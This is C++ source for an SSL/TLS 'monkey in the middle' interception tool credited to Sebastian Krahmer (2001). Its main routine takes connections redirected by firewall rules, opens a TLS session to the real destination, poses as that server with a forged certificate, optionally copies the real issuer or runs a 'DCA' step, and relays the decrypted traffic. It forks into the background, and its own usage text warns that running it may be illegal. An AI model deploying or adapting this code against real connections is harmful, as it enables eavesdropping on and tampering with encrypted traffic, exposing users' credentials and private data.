/*
 * Copyright (C) 2001 Sebastian Krahmer.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Sebastian Krahmer.
 * 4. The name Sebastian Krahmer may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
#include "misc.h"
#include "forward.h"
#include "socket.h"
#include "dca.h"

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include <string>
#include <signal.h>
#include <openssl/err.h>

using namespace NS_Misc;

int do_it(unsigned short, const char *, const char *);
bool enable_dca = false;
bool use_subject_for_issuer = true;

void usage(char *s)
{
	cerr<<"\nSSLv23 'Monkey in the middle' Implementation (C) 2001 by\n"
	      "Sebastian Krahmer <krahmer@cs.uni-potsdam.de>\n\n"
	      "Be warned that you maybe do illegal things by RUNNING this "
              "program !!!\n"
	      "Standard disclaimer applies.\n"
	      "(DCA enabled)\n\n"	 
	      "Usage: "<<s<<" [-D] [-I] <-C certfile> <-K keyfile> <-p port>\n"
	      "And do not forget to redirect traffic to 'port' via your"
	      " FW ruleset.\nUse '-I' to use real issuer of cert, "
       	      "'-D' for DCA.\n\n";

	exit(1);
}

int main(int argc, char **argv)
{
	
	unsigned short port = 0;
	string keyfile = "", certfile = "";
	int c;
	
	if (argc < 3)
		usage(argv[0]);
		
	// handle commandline arguments
	while ((c = getopt(argc, argv, "p:C:K:DI")) != -1) {
		switch (c) {
		case 'p':
			port = atoi(optarg);
			break;
		case 'C':
			certfile = optarg;
			break;
		case 'K':
			keyfile = optarg;
			break;
		case 'D':
			enable_dca = true;
			break;
		case 'I':
			use_subject_for_issuer = false;
			break;
		default:
			usage(argv[0]);
			break;
		}
	}
	
	if (!port || certfile.size() == 0 || keyfile.size() == 0)
		usage(argv[0]);
		
	if (signal(SIGCHLD, sig_x) < 0)
		die("main::signal");

	do_it(port, keyfile.c_str(), certfile.c_str());

	return 0;
}

int do_it(unsigned short port, const char *keyfile, const char *certfile)
{
	struct sockaddr_in from, dst;
	int sfd = 0, sfd2, afd, i = 0;
	string s_from, s_to;
	socklen_t socksize;
	char l[1024];
	
	// do the usual network-server setup
	if ((sfd = socket(PF_INET, SOCK_STREAM, 0)) < 0)
		die("main::socket");

	// bind+listen
	if (NS_Socket::bind_local(sfd, port, true) < 0)
		die(NS_Socket::why());

	socksize = sizeof(from);

	CSession *client = NULL;
	SSession *server = NULL;

	try {
		client = new CSession();
		server = new SSession();
	} catch (int) {
		die("Can't create Sessions.");
	}

	if (server->load_files(keyfile, certfile) < 0) {
		fprintf(stderr, "%s\n", server->why());
		exit(-1);
	}

	// shadow
	if (fork() > 0) {
		log("Going background.");
		exit(0);
	}
	setsid();
	
	// block for incoming connections
	while ((afd = accept(sfd, (sockaddr*)&from, &socksize)) >= 0) {	
		
		// Get real destination
		// of connection
		if (NS_Socket::dstaddr(afd, &dst) < 0) {
    			log(NS_Socket::why());
			die(NULL);
		}

		s_from = inet_ntoa(from.sin_addr);
		s_to   = inet_ntoa(dst.sin_addr);
	
		snprintf(l, sizeof(l), "Forwarding %s:%d -> %s:%d", 
				s_from.c_str(), ntohs(from.sin_port),
				s_to.c_str(), ntohs(dst.sin_port));		
		log(l);	
		++i;
		if (fork() == 0) {
				
			// --- client-side
			if ((sfd2 = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
				log("main::socket");
				die(NULL);
			}

			
			if (NS_Socket::bind_local(sfd2, 8888+i, 0) < 0) {
				log(NS_Socket::why());
				die(NULL);
			}
			
	
			// fire up connection to real server
			if (connect(sfd2, (struct sockaddr*)&dst, 
			    sizeof(dst)) < 0) {
				log("main::connect");
				die(NULL);
			}
			
			if (NS_Socket::nodelay(afd) < 0 ||
			    NS_Socket::nodelay(sfd2) < 0)
				log(NS_Socket::why());
    
			client->start();
			client->fileno(sfd2);	// this socket to use
			
			// do SSL handshake
			if (client->connect() < 0) {
				log("Clientside handshake failed. Aborting.");
				die(NULL);
			}
			
			// --- server-side

			server->start();	// create SSL object
			server->fileno(afd);	// set socket to use
			
			if (enable_dca)
				NS_DCA::do_dca(client, server);

			// do SSL handshake as fake-server
			if (server->accept() < 0) {
				log("Serverside handshake failed. Aborting.");
				die(NULL);
			}

			ssl_forward(client, server);

			delete client;
			delete server;
			exit(0);
		}
		close(afd);
	}	
					
	return 1;
}
